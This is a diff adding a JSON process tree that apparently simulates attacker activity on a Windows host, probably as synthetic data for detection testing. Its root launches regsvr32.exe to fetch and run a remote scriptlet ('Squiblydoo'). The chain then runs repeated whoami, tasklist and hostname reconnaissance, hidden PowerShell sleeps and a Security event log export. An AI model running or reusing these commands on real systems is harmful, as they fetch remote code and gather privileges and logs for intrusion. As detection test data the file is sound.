@@ -1,0 +1,332 @@
+{
+  "pid": 209855,
+  "ppid": 0,
+  "name": "scriptlauncher.exe",
+  "command": "scriptlauncher.exe ",
+  "children": [
+    {
+      "pid": 209856,
+      "ppid": 209855,
+      "name": "regsvr32.exe",
+      "command": "regsvr32.exe /s /n /u /i:\"http://intra-update.corp.local/pkg/postreg.sct\" scrobj.dll",
+      "children": [
+        {
+          "pid": 209860,
+          "ppid": 209856,
+          "name": "whoami.exe",
+          "command": "whoami.exe /priv",
+          "children": [
+            {
+              "pid": 209864,
+              "ppid": 209860,
+              "name": "cmd.exe",
+              "command": "cmd.exe /c \"echo maintenance step\"",
+              "children": [
+                {
+                  "pid": 209865,
+                  "ppid": 209864,
+                  "name": "tasklist.exe",
+                  "command": "tasklist.exe /v",
+                  "children": [
+                    {
+                      "pid": 209872,
+                      "ppid": 209865,
+                      "name": "powershell.exe",
+                      "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 20\"",
+                      "children": [
+                        {
+                          "pid": 209877,
+                          "ppid": 209872,
+                          "name": "ping.exe",
+                          "command": "ping.exe -n 23 127.0.0.1 > nul",
+                          "children": [
+                            {
+                              "pid": 209878,
+                              "ppid": 209877,
+                              "name": "hostname.exe",
+                              "command": "hostname.exe",
+                              "children": [
+                                {
+                                  "pid": 209881,
+                                  "ppid": 209878,
+                                  "name": "ping.exe",
+                                  "command": "ping.exe -n 21 127.0.0.1 > nul",
+                                  "children": [
+                                    {
+                                      "pid": 209887,
+                                      "ppid": 209881,
+                                      "name": "tasklist.exe",
+                                      "command": "tasklist.exe /fi \"imagename eq svchost.exe\"",
+                                      "children": []
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    },
+                    {
+                      "pid": 209893,
+                      "ppid": 209865,
+                      "name": "tasklist.exe",
+                      "command": "tasklist.exe /svc",
+                      "children": [
+                        {
+                          "pid": 209900,
+                          "ppid": 209893,
+                          "name": "hostname.exe",
+                          "command": "hostname.exe > \"C:\\Users\\farhan.menon\\AppData\\Local\\Temp\\host_cf9a22f9.txt\"",
+                          "children": [
+                            {
+                              "pid": 209907,
+                              "ppid": 209900,
+                              "name": "whoami.exe",
+                              "command": "whoami.exe /all",
+                              "children": [
+                                {
+                                  "pid": 209910,
+                                  "ppid": 209907,
+                                  "name": "hostname.exe",
+                                  "command": "hostname.exe",
+                                  "children": [
+                                    {
+                                      "pid": 209915,
+                                      "ppid": 209910,
+                                      "name": "timeout.exe",
+                                      "command": "timeout.exe /t 4 /nobreak",
+                                      "children": []
+                                    }
+                                  ]
+                                }
+                              ]
+                            },
+                            {
+                              "pid": 209919,
+                              "ppid": 209900,
+                              "name": "findstr.exe",
+                              "command": "findstr.exe /i \"failed\" \"C:\\ProgramData\\Woodgrove\\Logs\\profile.log\"",
+                              "children": [
+                                {
+                                  "pid": 209920,
+                                  "ppid": 209919,
+                                  "name": "hostname.exe",
+                                  "command": "hostname.exe > \"C:\\Users\\farhan.menon\\AppData\\Local\\Temp\\host_b4c547e5.txt\"",
+                                  "children": [
+                                    {
+                                      "pid": 209921,
+                                      "ppid": 209920,
+                                      "name": "whoami.exe",
+                                      "command": "whoami.exe /groups",
+                                      "children": [
+                                        {
+                                          "pid": 209924,
+                                          "ppid": 209921,
+                                          "name": "tasklist.exe",
+                                          "command": "tasklist.exe",
+                                          "children": [
+                                            {
+                                              "pid": 209927,
+                                              "ppid": 209924,
+                                              "name": "cmd.exe",
+                                              "command": "cmd.exe /c \"wevtutil.exe epl \"Security\" \"C:\\ProgramData\\Contoso\\Logs\\Security_f7a04076.evtx\"\"",
+                                              "children": [
+                                                {
+                                                  "pid": 209932,
+                                                  "ppid": 209927,
+                                                  "name": "choice.exe",
+                                                  "command": "choice.exe /d y /t 18 > nul",
+                                                  "children": [
+                                                    {
+                                                      "pid": 209935,
+                                                      "ppid": 209932,
+                                                      "name": "tasklist.exe",
+                                                      "command": "tasklist.exe",
+                                                      "children": [
+                                                        {
+                                                          "pid": 209939,
+                                                          "ppid": 209935,
+                                                          "name": "powershell.exe",
+                                                          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 8\"",
+                                                          "children": [
+                                                            {
+                                                              "pid": 209944,
+                                                              "ppid": 209939,
+                                                              "name": "whoami.exe",
+                                                              "command": "whoami.exe > \"C:\\Users\\farhan.menon\\AppData\\Local\\Temp\\who_52720f25.txt\"",
+                                                              "children": []
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                },
+                                                {
+                                                  "pid": 209951,
+                                                  "ppid": 209927,
+                                                  "name": "whoami.exe",
+                                                  "command": "whoami.exe /all > \"C:\\Users\\farhan.menon\\AppData\\Local\\Temp\\who_4be2cd1c.txt\"",
+                                                  "children": [
+                                                    {
+                                                      "pid": 209954,
+                                                      "ppid": 209951,
+                                                      "name": "tasklist.exe",
+                                                      "command": "tasklist.exe",
+                                                      "children": [
+                                                        {
+                                                          "pid": 209959,
+                                                          "ppid": 209954,
+                                                          "name": "whoami.exe",
+                                                          "command": "whoami.exe /groups",
+                                                          "children": [
+                                                            {
+                                                              "pid": 209961,
+                                                              "ppid": 209959,
+                                                              "name": "hostname.exe",
+                                                              "command": "hostname.exe > \"C:\\Users\\farhan.menon\\AppData\\Local\\Temp\\host_32984d7e.txt\"",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 209968,
+                                                                  "ppid": 209961,
+                                                                  "name": "tasklist.exe",
+                                                                  "command": "tasklist.exe",
+                                                                  "children": [
+                                                                    {
+                                                                      "pid": 209969,
+                                                                      "ppid": 209968,
+                                                                      "name": "powershell.exe",
+                                                                      "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'hostname.exe' -ArgumentList '' -Wait\"",
+                                                                      "children": [
+                                                                        {
+                                                                          "pid": 209976,
+                                                                          "ppid": 209969,
+                                                                          "name": "whoami.exe",
+                                                                          "command": "whoami.exe /priv",
+                                                                          "children": [
+                                                                            {
+                                                                              "pid": 209977,
+                                                                              "ppid": 209976,
+                                                                              "name": "tasklist.exe",
+                                                                              "command": "tasklist.exe /fi \"imagename eq svchost.exe\"",
+                                                                              "children": [
+                                                                                {
+                                                                                  "pid": 209981,
+                                                                                  "ppid": 209977,
+                                                                                  "name": "choice.exe",
+                                                                                  "command": "choice.exe /d y /t 4 > nul",
+                                                                                  "children": [
+                                                                                    {
+                                                                                      "pid": 209986,
+                                                                                      "ppid": 209981,
+                                                                                      "name": "hostname.exe",
+                                                                                      "command": "hostname.exe > \"C:\\Users\\farhan.menon\\AppData\\Local\\Temp\\host_5a4bdafd.txt\"",
+                                                                                      "children": [
+                                                                                        {
+                                                                                          "pid": 209992,
+                                                                                          "ppid": 209986,
+                                                                                          "name": "whoami.exe",
+                                                                                          "command": "whoami.exe > \"C:\\Users\\farhan.menon\\AppData\\Local\\Temp\\who_403bc1b9.txt\"",
+                                                                                          "children": [
+                                                                                            {
+                                                                                              "pid": 209995,
+                                                                                              "ppid": 209992,
+                                                                                              "name": "whoami.exe",
+                                                                                              "command": "whoami.exe /groups > \"C:\\Users\\farhan.menon\\AppData\\Local\\Temp\\who_cd603ac4.txt\"",
+                                                                                              "children": [
+                                                                                                {
+                                                                                                  "pid": 210002,
+                                                                                                  "ppid": 209995,
+                                                                                                  "name": "powershell.exe",
+                                                                                                  "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 19\"",
+                                                                                                  "children": [
+                                                                                                    {
+                                                                                                      "pid": 210007,
+                                                                                                      "ppid": 210002,
+                                                                                                      "name": "timeout.exe",
+                                                                                                      "command": "timeout.exe /t 20 /nobreak",
+                                                                                                      "children": [
+                                                                                                        {
+                                                                                                          "pid": 210012,
+                                                                                                          "ppid": 210007,
+                                                                                                          "name": "powershell.exe",
+                                                                                                          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 10\"",
+                                                                                                          "children": [
+                                                                                                            {
+                                                                                                              "pid": 210014,
+                                                                                                              "ppid": 210012,
+                                                                                                              "name": "hostname.exe",
+                                                                                                              "command": "hostname.exe > \"C:\\Users\\farhan.menon\\AppData\\Local\\Temp\\host_90c8adce.txt\"",
+                                                                                                              "children": [
+                                                                                                                {
+                                                                                                                  "pid": 210016,
+                                                                                                                  "ppid": 210014,
+                                                                                                                  "name": "hostname.exe",
+                                                                                                                  "command": "hostname.exe",
+                                                                                                                  "children": [
+                                                                                                                    {
+                                                                                                                      "pid": 210023,
+                                                                                                                      "ppid": 210016,
+                                                                                                                      "name": "tasklist.exe",
+                                                                                                                      "command": "tasklist.exe /v",
+                                                                                                                      "children": []
+                                                                                                                    }
+                                                                                                                  ]
+                                                                                                                }
+                                                                                                              ]
+                                                                                                            }
+                                                                                                          ]
+                                                                                                        }
+                                                                                                      ]
+                                                                                                    }
+                                                                                                  ]
+                                                                                                }
+                                                                                              ]
+                                                                                            }
+                                                                                          ]
+                                                                                        }
+                                                                                      ]
+                                                                                    }
+                                                                                  ]
+                                                                                }
+                                                                              ]
+                                                                            }
+                                                                          ]
+                                                                        }
+                                                                      ]
+                                                                    }
+                                                                  ]
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
